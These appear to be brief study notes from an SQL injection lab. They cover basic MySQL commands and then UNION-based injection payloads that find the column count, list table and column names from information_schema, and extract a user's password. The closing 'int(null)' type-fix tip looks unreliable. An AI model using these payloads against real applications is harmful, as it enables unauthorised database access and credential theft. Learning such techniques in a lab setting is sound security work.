# SQL Injection Notes

This section covers SQL Injection techniques

## Basic SQL Commands 

```
show databases;
```

```
use sqldemo;
```

```
show tables;
```

```
select * from users;
```

```
select age from users where username = "jeremy";
```

```
select age from users where username = "jeremy";
```

## UNION select 
When we union select, we can only select the same amount of columns in the query. 

```
jeremy' union select null,null,null 
```

To explain the above. If we do:
```
jeremy' union select null
```
Then nothing gets returned, same for if we do:
```
null, null
```

However if we do:
```
null,null,null
```

We get a valid response. This is because the database is parsing three sets of information. However is only displaying Username and Email, its likely that the website only wants to display those two bits of info. So lets try and manipulate this:

We can use the third null to inject our commands.

Now we can use this to get more information about the database:
```
jeremy' union select null, null, table_name from information_schema.tables#
```

Now we have all the table names, we can get the column names :

```
jeremy' union select null, null, column_name from information_schema.columns#
```

Now lets get jeremy's password. 

List the tables, we are working with injection0x01 in this case. 

```
jeremy' union select null, null, password from injection0x01#
```

If you try to union select a string on a column that is an integer, you can get an error.

you can do:

```
int(null)
```
to fix it. 
